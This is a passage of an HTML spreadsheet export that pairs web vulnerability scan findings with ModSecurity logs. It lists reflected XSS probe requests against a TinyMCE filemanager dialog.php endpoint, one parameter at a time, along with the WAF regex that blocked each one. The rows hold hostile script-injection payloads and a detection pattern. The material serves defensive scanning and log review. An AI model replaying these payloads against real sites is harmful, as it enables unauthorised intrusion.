</td><td class=xl24 width=64 >2015-04-01 09:29:34</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:32 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(874099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttJKwQAW0AAD9hYOQAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttJKwQAW0AAD9hYOQAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366927</td><td class=xl24 width=64 >2015-03-31 22:46:53</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id='&gt;&lt;script&gt;alert(804299)&lt;/script&gt;&lt;!--&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=8jhf34odo57f3tejlqgnrfs7g1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:35</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:34 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(804299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttJqwQAW0AABt@bWMAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttJqwQAW0AABt@bWMAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366928</td><td class=xl24 width=64 >2015-03-31 22:48:38</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain='&gt;&lt;script&gt;alert(864999)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=1huhrf94nme5k16pml5rr0e290
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:36</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:35 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(864999)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttJ6wQAW0AAHgzv00AAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttJ6wQAW0AAHgzv00AAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366929</td><td class=xl24 width=64 >2015-03-31 22:49:09</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang='&gt;&lt;script&gt;alert(324899)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=/&amp;551ac2f79e23f=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%2F; PHPSESSID=h9ho9vo7ulcavq3u2lifqtpah1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:37</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:36 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(324899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttKKwQAW0AAHchlVsAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttKKwQAW0AAHchlVsAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366930</td><td class=xl24 width=64 >2015-03-31 22:50:22</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=&quot;&gt;&lt;script&gt;alert(695199)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=63ufabouchio00ld4de4t5u4a0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:39</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:37 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(695199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttKawQAW0AAB7zKNoAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttKawQAW0AAB7zKNoAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366931</td><td class=xl24 width=64 >2015-03-31 22:53:49</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id='&gt;&lt;script&gt;alert(449099)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=l4rh2kok6hv8ghtdsu5jcdlbk5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:40</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:39 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(449099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttK6wQAW0AAHhGMuMAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttK6wQAW0AAHhGMuMAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366932</td><td class=xl24 width=64 >2015-03-31 22:55:34</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey='&gt;&lt;script&gt;alert(674299)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=h9s9lere37m9ocu8uveb5qbtr0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:41</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:40 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(674299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttLKwQAW0AAHzDqskAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttLKwQAW0AAHzDqskAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366933</td><td class=xl24 width=64 >2015-03-31 22:57:19</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=&quot;&gt;&lt;script&gt;alert(987499)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=6v194rcpkulap95o3o0is3so52
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:42</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:41 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(987499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttLawQAW0AAHewA9kAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttLawQAW0AAHewA9kAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366934</td><td class=xl24 width=64 >2015-03-31 22:59:03</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
